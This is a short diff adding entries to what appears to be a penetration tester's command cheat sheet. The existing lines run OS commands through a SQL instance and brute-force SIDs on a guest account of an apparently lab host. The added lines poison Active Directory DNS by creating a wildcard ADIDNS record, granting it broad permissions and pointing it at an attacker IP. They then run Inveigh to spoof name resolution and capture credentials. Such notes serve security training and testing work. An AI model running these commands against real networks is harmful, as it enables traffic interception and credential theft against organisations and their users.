@@ -893,3 +893,13 @@ Invoke-SQLOSCmd -Instance fortress-db -Command "whoami"
 
 [bruteforce_sid]
 lookupsid.py vulnnet-rst.local/guest@10.10.130.156
+
+[ADIDNS]
+new-adidnsnode -node * -verbose
+grant-adidnspermission -node * -principal "Authenticated Users" -Access GenericAll -Verbose
+# Update DNS Record
+Invoke-DNSUpdate -DNSType A -DNSName * -DNSData 192.168.21.123 -Verbose
+
+[Inveigh]
+Invoke-Inveigh -ConsoleOutput Y
+Invoke-Inveigh -FileOutput \windows\tasks\test.txt
